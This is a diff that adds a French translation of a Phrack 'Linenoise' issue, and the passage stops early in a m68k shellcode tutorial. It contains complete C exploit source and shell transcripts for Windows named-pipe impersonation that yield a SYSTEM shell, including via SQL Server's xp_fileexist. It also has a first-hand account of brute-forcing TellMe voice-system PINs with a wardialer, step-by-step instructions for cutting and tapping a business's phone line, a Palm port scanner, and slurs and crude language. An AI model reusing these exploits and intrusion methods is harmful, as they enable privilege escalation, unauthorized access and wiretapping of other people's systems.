@@ -1,0 +1,1574 @@
+                          ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3d, Phile #0x03 of 0x0f
+
+|=---------------------=[ L I N E N O I S E ]=---------------------------=|
+|=------------=[Traduit par kes et jacob[degenere-science]=--------------=|
+|=------------------------=[ Phrack Staff ]=-----------------------------=|
+
+
+    Tout ce qui ne peut être placé ailleurs peut se trouver ici : Les 
+corrections aux précédent articles, aux petit articles, ou les articles 
+qui n’ont simplement pas était publié .... Tout.
+
+Table des matières
+
+1 – Exploitation de pipe nommée sous Windows par DigitalScream
+2 – Comment hacker dans ‘TellMe’             par Archangel
+3 – Shitboxing                               par Agent5
+4 – PalmMap v 1.6 – Nmap pour palm           par Shaun Colley
+5 – Ecriture de shellcode linux/mc68xxx      par madcr
+6 – trouver des modules kernel caché         par madsys
+7 – Bonne vieille disquette explosives       par phrick
+
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 1 - Exploitation de pipe nommée sous Windows ]=--------------------=|
+|=-----------------------------------------------------------------------=|
+
+Toute les dernières version de l’OS Microsoft Windows sont basées sur le 
+kernel NT. Cela a un impact positif pour la sécurité tant au niveau local 
+que remote du monde windows. Pourtant, il y a encore plusieurs choses 
+permettant d’obtenir les privilèges local system sur l’ordinateur local, 
+ce qui compromisera le système tout entier. En temps normal, cela est du 
+aux fait qu’il y a différents buffer overun dans la pile ou dans le heap, 
+dans les services systèmes, comme dans le cas de plusieurs opérations 
+système. Toutefois, nous ne devons pas oublier les bugs liés à un 
+dysfonctionnement des/d'une fonctionnalité système. Ce genre de bugs dépend
+vraiment du système, et de temps à autre, est trouvé dans différent OS. 
+Bien sur Windows ne fait pas exception.
+
+Les bugs spécifiques ont généralement un impact sur les utilisateurs 
+locaux. Bien sur, ce n’est pas un axiome, mais l’utilisateur local a plus
+de fonctions API du system comparé à un utilisateur distant. Nous allons 
+donc voir les possibilités pour un utilisateur local d’obtenir des 
+privilèges plus importants. Par ‘privilège plus important’ j’entend 
+obtenir des privilèges local système qui n’ont aucune limitation. Il y a
+plusieurs possibilités pour cela, je vais vous en exposer une nouvelle.
+
+D’apres MSDN, pour lancer une application avec des accounts différent, 
+l’un doit utiliser les fonctions LogonUser() et CreateProcessAsUser(). 
+LogonUser() requiere le nom d’utilisateur et le password pour le compte 
+dont nous avons besoin. La tache ‘LogonUser()’ est fixée aux privilèges 
+SE_ASSIGNPRIMARYTOKEN_NAME et SE_INCREASE_QUOTA_NAME pour l’accès token.
+Ces privilèges sont requis pour CreateProcessAsUser(). Seul les processus 
+système ont ces privilèges. Actuellement, le compte ‘Administrateur’ n’as 
+pas assez de droit pour CreateProcessAsUser(). Ainsi, pour exécuter des 
+applications comme cmd.exe avec le compte localSystem, nous devons déjà 
+l’avoir. Mais comme nous n’avons pas l’username et le password de 
+l’utilisateur privilégié, nous devons trouver une autre solution.
+
+Dans cet article nous allons voir comment obtenir les privilèges 
+« LocalSystem » avec l’API aux acces fichier. Pour ouvrir une application 
+Windows appellant la fonction CreateFile(), sa se passe comme ceci :
+
+HANDLE CreateFile(
+LPCTSTR lpFileName,
+DWORD dwDesiredAccess,
+DWORD dwShareMode,
+LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+DWORD dwCreationDisposition,
+DWORD dwFlagsAndAttributes,
+HANDLE hTemplateFile
+);
+
+Pour ouvrir le fichier nous devons appeler quelque chose comme :
+
+HANDLE hFile;
+hFile=CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
+OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+Pour les programmeurs Windows avancés, il est clair que cette fonction  
+permet de faire plus de choses que seulement d’ouvrir des fichiers 
+ordinaires. Elle est utilisée pour créer de nouveaux fichiers, répertoires, 
+lecteur physique, et différente ressources pour la communication 
+interprocess, comme les pipes et les mailslots. Nous allons nous attarder
+sur les pipes.
+
+Les pipes sont utilisées pour une chose, l’échange de données entre les 
+processus parent et enfant, ou entre deux processus enfant. Toutes les
+opérations d’écriture/lecture sont fermées pour les opérations sur le 
+même fichier.
+
+Les pipes nommé sont utilisé pour deux chose, l’échange de data entre le 
+client et le serveur, ou entre deux processus client. Il existe des 
+fichiers (possédant les mêmes caractéristiques que les pipes (precedement
+cités )) , mais pouvant être utilisé pour l’échange de données sur le réseaux.
+
+La création de pipe nommée se fait ainsi :
+
+HANDLE hPipe = 0;
+hPipe = CreateNamedPipe (szPipe, PIPE_ACCESS_DUPLEX,
+                         PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL);
+|=----------------------------------------------------------------------=|
+Le nom des pipes nommées peut varier, mais il y a toujours un format 
+prédéfini. Un exemple de nom valide est : ‘ \\.\pipe\Getsys’. Pour 
+Windows, la séquence ‘\\.\’ précède toujours le nom de fichier. Par 
+exemple, si ‘C:\boot.ini’ est demandé, le systeme accédera à 
+‘\\.\C:\boot.ini’. Ce format est compatible avec le standard UNC.
+
+Avec nos connaissances basiques sur les opérations pipes nommées, nous 
+pouvons supposer qu’il peut avoir une solution pour que l’application 
+accède à la pipe nommée plutôt que le dossier fourni par utilisateur. Par
+exemple, si nous créons une pipe nommé ‘\\.\pipe\Getsys’ nous pouvons 
+essayer de forcer l’application à accéder à ‘\\Computername\pipe\Getsys’.
+Cela nous donne donc une chance pour manipuler l’acces token.
+
+Le token Impersonnation est acces token avec les privilèges du client. 
+Donc, il est possible pour le serveur de faire quelque chose sur le nom du
+client. Dans notre cas le serveur est la pipe nommée que nous avons crée. 
+Cela devient possible parce que nous avons accordé le privilège 
+SecurityImpersonation pour le client. Plus précisément, nous pouvons 
+obtenir ce privilège. Si l’application du client à les privilèges system 
+local nous pouvons accéder aux registre, managé les processus et la 
+mémoire, et plein d’autre possibilité, non disponible pour un utilisateur
+ordinaire.
+
+
+Cette attaque peut facilement être réalisé en pratique. Le scénario pour 
+cette vulnérabilité se fait comme cela :
+
+1) Création de pipe nommée
+Le client attend de se connecter après la création de la pipe nommée.
+
+2) se faire passer pour le client
+Parce que nous supposons que l’application du client à les droit system, 
+que nous voulons obtenir également.
+
+3) Obtention des droits requis. En fait, nous avons seulement besoin de :
+
+- SE_ASSIGNPRIMARYTOKEN_NAME
+- SE_INCREASE_QUOTA_NAME
+
+- TOKEN_ALL_ACCESS
+- TOKEN_DUBLICATE
+
+C’est tout ce dont nous avons besoin pour la fonction 
+CreateProcessAsUser(). Pour obtenir les droits nous avons besoin d’un 
+nouveaux token avec les privilèges TOKEN_ALL_ACCESS. Et nous pouvons faire 
+cela, car nous avons les privilèges du processus client.
+
+Exécution du code de notre choix.
+
+Cela peut être un acces au registre, la configuration de hooks, ou des 
+commandes aléatoire avec les privilèges system. Ce dernier point est le 
+plus intéressant, parce que nous pouvons exécuter des applications 
+autonome de notre choix pour nos besoins spécifiques.
+
+Avec ce que nous venons de noir, je peux maintenant exécuter 
+CreateProcessAsUser() avec les privilèges system. Je recommence des le
+début, mais cette fois ci j’ai tout les privilèges requis, et ‘localSystem’
+est sous mon ‘contrôle’
+
+Il n’y a pas de problème pour réaliser cette approche. Par exemple, nous
+allons utiliser l’exploit réalisé par wirepair (sur sh0dan.org) basé sur 
+le code de macea (sur dogmile.com)
+
+#include <stdio.h>
+#include <windows.h>
+
+int main(int argc, char **argv)
+{
+char szPipe[64];
+DWORD dwNumber = 0;
+DWORD dwType = REG_DWORD;
+DWORD dwSize = sizeof(DWORD);
+DWORD dw = GetLastError();
+HANDLE hToken, hToken2;
+PGENERIC_MAPPING pGeneric;
+SECURITY_ATTRIBUTES sa;
+DWORD dwAccessDesired;
+PACL pACL = NULL;
+PSECURITY_DESCRIPTOR pSD = NULL;
+STARTUPINFO si;
+PROCESS_INFORMATION pi;
+
+if (argc != 2) {
+fprintf(stderr, "Usage: %s <progname>\n", argv[0]);
+return 1;
+}
+
+memset(&si,0,sizeof(si));
+sprintf(szPipe, "\\\\.\\pipe\\GetSys");
+
+// create named pipe"\\.\pipe\GetSys"
+
+HANDLE hPipe = 0;
+hPipe = CreateNamedPipe (szPipe, PIPE_ACCESS_DUPLEX,
+PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL);
+if (hPipe == INVALID_HANDLE_VALUE) {
+printf ("Failed to create named pipe:\n %s\n", szPipe);
+return 2;
+}
+
+printf("Created Named Pipe: \\\\.\\pipe\\GetSys\n");
+
+// initialize security descriptor to obtain client application
+// privileges
+pSD = (PSECURITY_DESCRIPTOR)
+LocalAlloc(LPTR,SECURITY_DESCRIPTOR_MIN_LENGTH);
+InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
+SetSecurityDescriptorDacl(pSD,TRUE, pACL, FALSE);
+sa.nLength = sizeof (SECURITY_ATTRIBUTES);
+sa.lpSecurityDescriptor = pSD;
+sa.bInheritHandle = FALSE;
+
+printf("Waiting for connection...\n");
+
+// wait for client connect
+ConnectNamedPipe (hPipe, NULL);
+
+printf("Impersonate...\n");
+
+// impersonate client
+
+if (!ImpersonateNamedPipeClient (hPipe)) {
+printf ("Failed to impersonate the named pipe.\n");
+CloseHandle(hPipe);
+return 3;
+}
+
+printf("Open Thread Token...\n");
+
+// obtain maximum rights with TOKEN_ALL_ACCESS
+
+if (!OpenThreadToken(GetCurrentThread(),
+TOKEN_ALL_ACCESS, TRUE, &hToken )) {
+
+if (hToken != INVALID_HANDLE_VALUE) {
+printf("GetLastError: %u\n", dw);
+CloseHandle(hToken);
+return 4;
+}
+}
+
+printf("Duplicating Token...\n");
+
+// obtain TOKEN_DUBLICATE privilege
+if(DuplicateTokenEx(hToken,MAXIMUM_ALLOWED,
+&sa,SecurityImpersonation,
+TokenPrimary, &hToken2) == 0) {
+
+printf("error in duplicate token\n");
+printf("GetLastError: %u\n", dw);
+return 5;
+}
+
+// fill pGeneric structure
+pGeneric = new GENERIC_MAPPING;
+pGeneric->GenericRead=FILE_GENERIC_READ;
+pGeneric->GenericWrite=FILE_GENERIC_WRITE;
+pGeneric->GenericExecute=FILE_GENERIC_EXECUTE;
+pGeneric->GenericAll=FILE_ALL_ACCESS;
+
+MapGenericMask( &dwAccessDesired, pGeneric );
+
+dwSize = 256;
+char szUser[256];
+GetUserName(szUser, &dwSize);
+
+printf ("Impersonating: %s\n", szUser);
+
+ZeroMemory( &si, sizeof(STARTUPINFO));
+si.cb = sizeof(si);
+si.lpDesktop = NULL;
+si.dwFlags = STARTF_USESHOWWINDOW;
+si.wShowWindow = SW_SHOW;
+
+printf("Creating New Process %s\n", argv[1]);
+
+// create new process as user
+if(!CreateProcessAsUser(hToken2,NULL, argv[1], &sa,
+&sa,true, NORMAL_PRIORITY_CLASS |
+CREATE_NEW_CONSOLE,NULL,NULL,&si, ?)) {
+printf("GetLastError: %d\n", GetLastError());
+}
+
+// wait process to complete and exit
+WaitForSingleObject(pi.hProcess,INFINITE);
+CloseHandle(hPipe);
+
+return 0;
+}
+
+Cette vulnérabilité nous donne une chance d'obtenir les privilèges
+system sur l’ordinateur local. La seule condition est que le processus
+system doit accéder à ce canal. Cette condition est facile à reproduire
+avec les services system.
+Par exemple :
+
+[shell 1]
+
+>pipe cmd.exe
+Created Named Pipe: \\.\pipe\GetSys
+Waiting for connection...
+
+[shell 2]
+
+>time /T
+18:15
+
+>at 18:16 /interactive \\ComputerName\pipe\GetSys
+
+New task added with code 1
+[shell 1]
+Impersonate...
+Open Thread Token...
+Duplicating Token...
+Impersonating: SYSTEM
+Creating New Process cmd.exe
+
+Nous avons maintenant un nouveau cmd.exe avec les privilèges system. Cela
+signifie que l’utilisateur peut facilement obtenir les privilèges local 
+system. Bien sur reproduire cette situation est facile uniquement dans le 
+cas, ou il y a un service, qui peut accéder aux fichiers sur la demande de
+l’utilisateur. Parce que la commande AT a besoin au moins des privilèges 
+‘utilisateur avec pouvoir’ et peut être utilisé pour lancer directement 
+cmd.exe, sans aucune pipe nommé cet exemple est inutile.
+
+En pratique, cette vulnérabilité peut être exploité pour obtenir des 
+privilèges plus importants par l’user local si Microsoft SQL server est 
+installé. Le serveur SQL fonctionne avec les privilèges system, et peut 
+être accessible par les utilisateurs non-privilegié. @stake a reporté une 
+vulnérabilité dans la commande xp_fileexist. Cette commande vérifie 
+l’existence de fichier, et nous pouvons l’utiliser pour accéder à notre 
+pipe nommée. Le scénario d’attaque est vraiment proche :
+
+[shell 1]
+
+>pipe cmd.exe
+Created Named Pipe: \\.\pipe\GetSys
+Waiting for connection...
+
+[shell 2]
+
+C:\>isql -U user
+Password:
+1> xp_fileexist '\\ComputerName\pipe\GetSys'
+2> go
+File Exists File is a Directory Parent Directory Exists
+----------- ------------------- -----------------------
+1 0 1
+
+[shell 1]
+
+Impersonate...
+Open Thread Token...
+Duplicating Token...
+Impersonating: SYSTEM
+Creating New Process cmd.exe
+
+Finallement, il est bon de préciser que cette vulnérabilité existe dans 
+Windows NT/2000/XP, et que le SP4 et Windows 2003 la corrige.
+
+Un grand merci a ZARAZA (www.security.nnov.ru), sans lui, rien n’aurait 
+était possible.
+
+[1] Vue d'ensemble "personnifié un Client Apres Authentication"
+http://support.microsoft.com/default.aspx?scid=kb;[LN];821546
+
+[2] l’Exploit de maceo
+http://www.securityfocus.com/archive/1/74523
+
+[3] l’Exploit de wirepair
+http://www.securityfocus.com/archive/1/329197
+
+[4] Elévation de privilèges locaux par le nom de fichier d'un pipe nommé 
+www.atstake.com/research/advisories/2003/a070803-1.txt
+
+[5] le Service Pack 4 pour Windows 2000
+http://download.microsoft.com/download/b/1/a/
+b1a2a4df-cc8e-454b-ad9f-378143d77aeb/SP4express_EN.exe
+
+
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 2 - Comment hacker TellMe ]=---------------------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+Comment rentrer dans le reseau Tell-Me
+(1-800-555-tell)
+
+
+Ceci est la représentation des pensées de quelqu'un. Personne ne peut
+posseder les pensées d'une autre personne. Utilisez ces pensées comme vous
+en avez l'usage, vous pouvez les reproduire ou les utiliser comme bon vous
+semble.
+
+
+Par Archangel (du groupe P.H.I.R.M.)
+Archangel Systems
+http://the.feds.are.lookingat.us
+--------------------------------------
+
+
+
+
+Qu'est ce que le systeme Tell-Me?
+=================================
+
+TellMe est site telephonique high-tech activé à la voix avec une 
+connectivité internet, et meme un navigateur à activation vocale. Le but 
+ultime de TellMe est d'avoir tout (l')internet activé vocalement. Le 
+systeme est plutôt sophistiqué pour les standards actuels, bien que je 
+doute que les lecteurs de demain trouveront assez de force pour être 
+completement primitif afin d'en dire le moins [NDT: possible ?]. Un appel 
+téléphonique gratuit permets à l'auditeur d'avoir un acces aux informations, 
+aux resultats sportifs, à la meteo, etc. Il est meme possible d'ecouter 
+des films. Il y a aussi des champs d'application pour des annonces privées,
+ou même des sites web à activation vocale. En d'autre termes, il est 
+maintenant possible, par TellMe, de téléphoner pour ecouter un site web.
+
+Tell me est une succursale de CNET, un geant d'internet
+(au moment de l'ecriture de cet article).
+
+
+Quelles sont les lacunes de sécurité qui sont exploités?
+========================================================
+
+Bon, je pense que c'ets le moment pou couper des noisettes.
+TellMe a une TRES SERIEUSE faille de sécurité qui peut permettre un accès
+non autorisé au systeme dans un délais de quelques heures.
+Alors que j'essayais de hacker mon propre accompte, j'ai réalisé que les 
+annonces du TellMenu n'etaient protegé que par un mot de passe de 4 
+chiffres.
+
+
+Voilà ce que vous faîtes:
+- Vous téléphonez au 1-800-555-tell.
+- Vous allez obtenir un message publicitaire automatique
+  suivit d'un menu decrivant les differentes fonctionnalité de followed 
+  TellMe.
+- Vous devez dire le mot "Announcements", ou numeroter "198" sur le 
+  clavier.
+  celà vous menera a la section des annonces.
+- Une fois arrivé à la section annonce, vous allez devoir taper le numero d'annonce,
+  qui est un numero à 7 chiffre qui vous est assigné par l'ordinateur de
+  TellMe.
+- Rentrer n'importe quel numero d'annonce (j'ai d'abord essayer mon propre
+  numero au debut, car c'etait une manière de voir si j'etais capable de 
+  hacker ma propre annonce).
+  L'ordinateur repond, "Ok, here is your announcement." [NDT: Ok, voici 
+  votre annonce]
+  Et la, j'entend un enregistrement de "The Baron" me disant que j'etais 
+  une fiotte.
+- Ce message est suivit par un message de l'ordinateur disant:
+  S'il vous plait rentrer un autre numero d'annonce, ou dites "Main 
+  Menu" [NDT: menu principal] pour continuer. Si vous êtes l'auteur de
+  cette annonce, prière d'utiliser votre clavier téléphonique pour entrer 
+  votre mot de passe afin d'editer votre annonce. Si vous gardez le 
+  silence, l'ordinateur dira: "Please enter your 4 digit password."
+  [NDT: entrez votre mot de passe de 4 chiffres s'il vous plait]
+
+
+
+QUATRE CHIFFRES?????
+Ils etaient sérieux?
+
+Voilà le moteur du truc:
+TELLME ne vous deconnectera pas au bout de 3 tentatives dans une session!!!
+Oui, mesdames et messieurs, essayez de ne pas vomir.
+Pas de probleme.
+
+Apparemment il etaient possible de faire une attaque par force brute.
+J'y ai reussit en depoussierant un *TRES* vieux wardialer.
+
+Je me suis posé sur la ligne d'extension, à cause des limitations du 
+numeroteur et je l'ai ecouté tapant dans les codes d'acces. Quand j'ai 
+reussit, j'ai mis le programme du wardialer en pause. J'ai pu ensuite 
+regarder sur l'ecran, et voir quels ont été les derniers numeros essayé,
+j'ai ensuite essayé de me connecté nanuellement, et de gagner un acces. Je
+sais qu'il y a plus simple, mais celà decrit ce que j'ai fait.
+
+"The Baron" a eu assez pitié pour choisir un numero assez bas, et je suis 
+rentré, pour changer le message en quelque chose comme 10 minutes. J'ai 
+ensuite essayé 2 autres messages *SUR* ou je ne risquais pas de m'attiré 
+des problemes en les changeant. J'ai finit par rentrer en respectivement 
+45 et 90 minutes (plus ou moins). En calculant, j'ai trouvé que le temps 
+maximum pour casser une annonce TellMe en force brute etait d'environ 3
+heures.
+
+Est ce que c'est tout ?
+
+Non, avoir la capacité de changer une annonce peut être assez marrant,
+mais il y a des trucs largement plus interessant que vous pouvez faire
+en hackant TellMe.
+Vous vous souvenez du moment ou nous nous sommes logué la première fois,
+nous avions a dire "announcements"?
+Bon, maintenant dites le mot "Extensions". Vous pourriez être surpris de 
+ce que vous trouvez.
+
+
+
+que sont les extensions Tell-Me ?
+=================================
+
+Les extensions Tell-Me sont une partie du réseau Tellme, lequel a offert
+au monde de produire des pages webpages activable à la voix. Voilà ce
+vous faites:
+
+- Dites "Extensions". Vous allez être redirigé dans l'espace extension, et
+l'on vous demandera de taper un nemero d'extension. C'est un numero à 5 
+chiffres. C'etait de nouveau le moment pour mon vieux wardialer de faire 
+son oeuvre. (encore une fois, pas de probleme pour les tentatives 
+incorrectes [NDT: ...de deviner le code]
+
+
+Tout d'abord, il est important de mentionner que l'interet pour TellMe
+est agonisant. La plus part des extensions sont vides. Les seules 
+extensions qui fonctionnent toujours sont quelques extensions crées par 
+des developeurs individuels, des developpeur pour die-hard [NDT: la 
+serie de film avec bruce willis si il s'agit bien de la même chose], et 
+(c'est important plus tard) les *propres* extensions de TellMe.
+
+De prime abord, l'idée etait le numero d'extension comme une sorte de
+mot de passe, et il n'y pas de repertoire, et vous devez d'ores et déjà
+connaitre le numero d'extension pour obtenir un acces.
+
+J'ai verifié depuis l'hotel San Remo ici a Las Vegas, sous le nom de
+ma petite amie, et j'ai passé la nuit à hacker. J'ai reussit à obtenir
+ca jusqu'ici:
+
+
+
+Extension 76255:
+----------------
+
+Ca mene a un jeu tres bizare de type Pierre/papier/ciseau. C'est un des
+trucs les plus bizare que j'ai jamais vu depuis que je suis né. Je 
+recommande HAUTEMENT que vous l'essayiez. C'est comme une sorte de pédé 
+des montagnes... Ouai enfin voyez par vous même.
+
+
+Extension 11111:
+----------------
+
+Un gitan avec un "eight ball" [NDT: sorte de boule de cristal, mais pas 
+vraimment]. Vous lui posez une question, et ça vous donne la réponse. Il
+n'y a aucun disclaimer donc je suppose que c'est la verité! Dire "quit" ou
+"Stop" ne vous aidera pas. Fermez juste votre connerie de de gueule, et ca
+vous ejectera jusqu'au Tell-Me normal.
+
+Extension 33333:
+----------------
+Ca dit "HELLO WORLD"
+
+Extension 34118:
+----------------
+Produit un repertoire des agences Tell-me, avec les numeros de téléphones.
+
+La plupart des extensions valables sont en langage grossier, donc
+si vous êtes agé de moins de 18 ans arrêtez de lire.
+
+Utilisez les lettres de votre clavier téléphonique, et vous allez obtenir 
+un résultat très interessant. Il y a des mots de 5 lettres correspondant 
+aux nombres sur votre téléphone.
+
+
+CUNTS - Produit une serie de nombre à la signification inconnue.
+Juste une longue chaine d'un ordinateur disant "one, five, seven, three, 
+twelve, eighty-eight" etc. Je comprendrai plus tard ce que celà signifie.
+
+TITTY - Ca produit la tonalité d'un fax, à l'opposé de la tonalité d'un 
+ordinateur. J'ai pas cherché à bricoler avec.
+
+PENIS - Ca produit un message verbal a props du system sendmail.
+
+HOLES - Donne la citation du jour.
+
+BOOBS - C'est lié au protocole HTTP.
+
+SHIT0 - C'est le repertoire des lignes téléphonique du system TellMe.
+
+FUCK0 - C'est un repertoire tres interessant des lignes téléphonique du 
+systeme TellMe. Deux des lignes ont l'air d'être des lignes sécurisés, 
+fournissant une tonalité d'ordinateur que j'ai utilisé pour me loguer. Il 
+y avait une option pour les utilisateurs se servant du systeme pour la 
+première fois, qui m'a permit d'obtenir un accompte pour manager. (ils ont
+des centaines de managers ?) Qu'est ce que ca permets de faire ? J'ai été 
+capable d'effacer mon propre accompte et de le restorer. J'ai pas foutu la
+merde dans d'autres accomptes. Mon but n'est pas de détruire mais 
+d'apprendre.
+
+
+PISS0 - Comme au dessus, le systeme TellMe m'a donné le choix entre parler
+parler à une vrai personne, ou d'acceder a un repertoire automatique de 
+lignes téléphonique. Je suis etonné que tout ceci soit protegé seulement
+par un mot de passe de 5 chiffres.
+
+Damn0 - Un autre repertoire de ligne téléphonique sécurisé. Celui-la, en 
+revanche , vous demande d'emblée un autre mot de passe, je présume donc
+qu'il s'agit de la zone la plus sensible du point de vue de la sécurité!
+
+Pussy - Une description sur la façno de configurer une page web TellMe.
+
+Cum69 - Conseils pour generer un mot de passe sur. (hahahahahahahaha!!!!)
+
+EATME - Tonalité d'ordinateur ne menant nul part.
+
+
+Les protocoles de sécurité de TellMe sont pathétiques.
+
+Archangel (The Teflon Con)
+Wrath of God Hand Delivered
+http://the.feds.are.lookingat.us
+
+
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 3 - Shitboxing ]=--------------------------------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+par Agent5
+
+Vous êtes donc assis dans un petit restaurant familial ou alors vous êtes 
+en train de marcher dans une petite echoppe en regardant different types
+de marchandises, et comme il est normal plusieurs fois par jour, vous 
+entendez l'appel de la nature. Vous fa^tes donc votre chemin jusqu'au 
+toilettes pour homme (de préférence à une place) ou des toilettes pour 
+femme (pour les quelques unes
+qui pourraient lire ceci) et entrez. Vous faites ensuite ce que vous avez 
+à faire tout en regardant aux alentours (pourquoi ? parce que vous êtes 
+censé être sacrément attentif tout le temps. Voilà pourquoi.
+Votre regard vous amene jusqu'au plafond. Ca ressemble à tout
+les plafonds qui commence à partir en morceau. hmmmm... un plafond qui 
+s'effrite.... facile à oter. Vous vous mettez donc debout sur la cuvette,
+ou n'importe quoi et vous jetez un coup d'oeil. Rien de special sauf des 
+fils. Peut être electrique ou téléphoniques.
+TELEPHONE ? Attend ca signifie que je peux faire ce que dit cambrone et 
+utilisez le téléphone [NDT: traduction non littérale, afin de conserver 
+et le sens et la rime (!)] Ouai bien sur que vous pouvez! Vous avez 
+seulement besoin de quelques trucs afin de transformer en réalité votre 
+rêve de phreaking ultra feignant. Vous aurez besoin (en plus de votre 
+beige box avec un cable avec une prise RJ-11) d'un materiel qui vous 
+coutera probablement $3 dans le pire des cas et quelque chose comme $6 
+pour une pince a sertir les cables téléphoniques pour prise téléphonique 
+standard (RJ-11) vous aurez aussi besoin d'un... "séparateur de ligne 
+modulaire - permets d'avoir 2 prises téléphoniques femelle une fois 
+branché à l'extrémité d'un cable téléphonique. Prise femelle standard a 4
+fils. couleur: "ivoire"-- quelques dollar et change le cout maximum. La 
+plupart de ces composant peuvent être trouvé chez votre revendeur de
+composant electronique local. Bon si vous n'avez toujours pas compris ce
+que je cherche a obtenir, vous devriez dans ce cas demandez un avis 
+médical immédiatement. les scanners m'ont pour ma part beaucoup aidé 
+<petit tic nerveux>.
+
+Voici ce que vous avez à faire et faites le vite au cas ou ils essayraient
+d'utiliser le téléphone pendant que la ligne est déconnecté. DONC, fermer 
+la porte à clé et faites d'aller vite....Si vous commencez à avoir des gens
+qui frappent à la porte faites juste quelques vocalises bruyante laissant 
+à suggerer le defecation et dites que vous serez sorti dans une minute.
+
+1. Coupez la ligne. (Il n'est pas necessaire d'utiliser un outil 
+spécifique, quelque chose de coupant fera l'affaire)
+2. attacher une prise à chaque fin de ligne que vous avez coupé.
+3. Brancher une des fins de la prise avec un des fins du trou du 
+separateur, mettez celle qui reste avec un des deux trous au debut du
+separateur.
+4. Maintenant vous pouvez soit partir et laisser le vieux gars stressé de 
+l'intestin qui toque à la porte, ou vous pouvez brancher votre beige box 
+et vous amuser un peu.
+
+Faites comme vous feriez n'importe quelle autre session de beige boxing.
+Gardez à l'esprit que les gens qui possede le téléphone pourraient vouloir
+l'utiliser et ne pourraient pas apprecier le fait que quelqu'un soit sur 
+la ligne. Mais pour le reste cette salle de bain ordinaire est juste
+devenue votre cabine telephonique privée, completé de l'eau courante et 
+de toilettes pour la somme astronomique de 3 dollars américain.
+
+"Ce fichier vous est proposez par ceux qui font des trucs chouettes".
+
+Applaudisements à Epiphany, Bizurke, Master Slate, Ic0n, Xenocide, Bagel,
+Hopping Goblin, Maddjimbeam, lioid, emerica, le reste des #mabell
+ninja, port7 alliance, et LPH crew .
+
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 4 - PalmMap v1.6 - Nmap pour Palm ]=-------------------------------=|
+|=-----------------------------------------------------------------------=|
+
+(proposé par Shaun Colley <shaunige at yahoo.co.uk>)
+
+[NDT: programme non testable pour le traducteur, pas de Palm, :/ donc par acquis de conscience
+je n'ai pas traduit les deux ou trois instruction affichant des textes en anglais]
+
+-----BEGIN PALMMAP-----
+# PalmMap.bas
+# PalmMap v1.6 - Nmap for Palm.
+
+fn set_auto_off(0)
+s$(0) = "Host:"
+s$(2) = "Start Port:"
+s$(4) = "End Port:"
+f = form(9, 3, "PalmMap v1.6")
+if f = 0 then end
+if f = 2 then gosub about
+let h$ = s$(1)
+let p = val(s$(3))
+let e = val(s$(5))
+let i = p
+let t$ = "PalmMap.log"
+open new "memo", t$ as #4
+form2:
+cls
+form btn 30 , 40 , 40 , 18, "connect()", 1
+form btn 85 , 40, 40 , 18 , "TCP SYN" , 1
+form btn 60 , 80 , 40 , 18 , "UDP scan" , 1
+form btn 60 , 120, 40 , 18 , "TCP FIN " , 1
+draw "Scan type?", 50, 20, 1
+while
+x = asc(input$(1))
+if x = 14 then gosub scan
+if x = 15 then print "Scan type not implemented as of
+yet."
+if x = 16 then print "Scan type not implemented as of
+yet."
+if x = 17 then print "Scan type not implemented as of
+yet."
+wend
+
+sub scan
+cls
+print at 50, 40
+while(i <= e)
+c = fn tcp(1, h$, i)
+if(c = 0)
+print "Port ", i, "Open"
+fn tcp(-1, "", 0)
+print #4, "Port ", i, "Open"
+else
+fn tcp(-1, "", 0)
+print #4, "Port ", i, "Closed"
+endif
+let i = i + 1
+wend
+close #4
+print "Scan complete!"
+end
+
+sub about
+cls
+msgbox("PalmMap - Nmap for Palm.", "About PalmMap
+1.6")
+-----END PALMMAP-----
+
+
+
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 5 - Ecrire des shellcodes pour Linux/mc68xxx]=---------------------=|
+|=-----------------------------------------------------------------------=|
+
+par madcr (madrats@mail.ru)
+
+
+I Introduction.
+II Registres.
+III Syscalls.
+IV Execve shellcode.
+V Bind-socket shellcode.
+VI References.
+
+I. Introduction. (NDT: pour un historique de motorola voir ici:
+http://fr.gsmbox.com/news/mobile_news/all/54371.gsmbox et je sais tout n'est pas pareil)
+
+L'histoire de Motorola commence déjà vers 1920 ou ils produisaient des eléments de radio,
+ils n'etaient pas connu pour leurs ordinateurs. Ce n'est qu'en 1974 que motorola sort
+le premier processeur 8 bits - le MC6800 contenant 4000 transistors et en 1979 motorola
+annonce le premier processeur a 16 bit le MC68000 capable de 2000000 d'operations à la
+seconde. Apres 5 années supplementaires, en 1984 motorola lance le premier processeur
+(MC68020), contenant 200000 transistors. Jusqu'à 1994 inclu, motorola améliora des
+series de ses processeurs et celà les conduira en mars à lancer le MC68060 contenant 2,5
+millions de transistors. De nos jours, le 68060 est le processeur optimal pour l'utilisation
+de n'importe quel unix.
+
+
+Le processeur peut travailler en 2 modes: Utilisateur et superviseur. Ce n'est pas une
+analogie avec les modes réels et protegé pour les processeurs x86. C'est une sorte de protection
+"juste au cas ou". Dans le mode utilisateur, il est impossible de creer des exceptions et
+il est impossible d'avoir acces a toute les zones de la memoire. Dans le mode superviseur
+tout est accessible. En consequence le kernel travaille en mode superviseur et le reste
+en mode utilisateur.
+
+Le MC68 supportait une quantité de distributions unix, comme netbsd, openbsd, linux redhat
+, linux debian, etc. Le present article porte sur linux (debian en particulier)
+
+
+II. Registres.
+
+Le processeur est dans les faits un CISC (mais à certaines occasions un RISC)
+Il y a en revanche pas mal de registres.
+
+8 registres de données: avec %d0 sur %d7.
+8 registres d'adresses: avec %a0 sur %a7.
+Le registre du status: %sr.
+2 indexs de piles: %sp et %fp
+Le compteur de programme: %pc.
+
+N'ou n'avons besoin de rien d'autre. Et la quantité minimale d'instruction
+qui est requise pour le shellcode:
+
+
+instruction exemple description
+
+move movl %d0,%d1 mets la valeur de %d0 dans %d1
